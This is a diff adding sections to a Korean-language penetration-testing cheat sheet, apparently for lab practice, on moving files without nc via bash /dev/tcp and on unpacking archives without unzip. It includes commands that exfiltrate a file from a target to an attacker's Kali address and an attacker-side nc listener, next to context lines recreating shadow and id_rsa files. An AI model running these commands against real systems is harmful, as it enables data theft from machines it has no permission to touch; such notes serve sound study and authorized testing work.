@@ -83,6 +83,33 @@ echo "BASE64STRING" | base64 -d > shadow
 echo "BASE64STRING" | base64 -d > id_rsa
 chmod 600 id_rsa
 ```
+## /dev/tcp (nc / ncat 없을 때)
+
+bash 내장 기능. 타겟에 nc 가 없어도 TCP 로 주고받는다.
+
+```bash
+# 공격자가 listen
+sudo nc -l -p 443 -q 0 < file_to_send
+
+# 타겟에서 수신 (nc 없이)
+cat < /dev/tcp/<칼리IP>/443 > received_file
+
+# 반대로 타겟에서 반출 (공격자: nc -lvnp 443 > out)
+cat file > /dev/tcp/<칼리IP>/443
+```
+
+## 압축 해제 (unzip 없을 때)
+
+저권한 쉘엔 unzip 이 없는 경우가 많다. 설치 없이 푼다.
+
+```bash
+python3 -c "import zipfile; zipfile.ZipFile('file.zip').extractall()"
+jar xf file.zip          # JDK 있을 때
+# tar 류
+tar xf file.tar.gz ; tar xf file.tar.bz2
+```
+
+- 파일 하나면 압축을 유지할 이유가 없다. 보내기 전에 미리 풀어서 알맹이만 전송하면 타겟에서 해제 단계를 생략한다
 
 ---
 
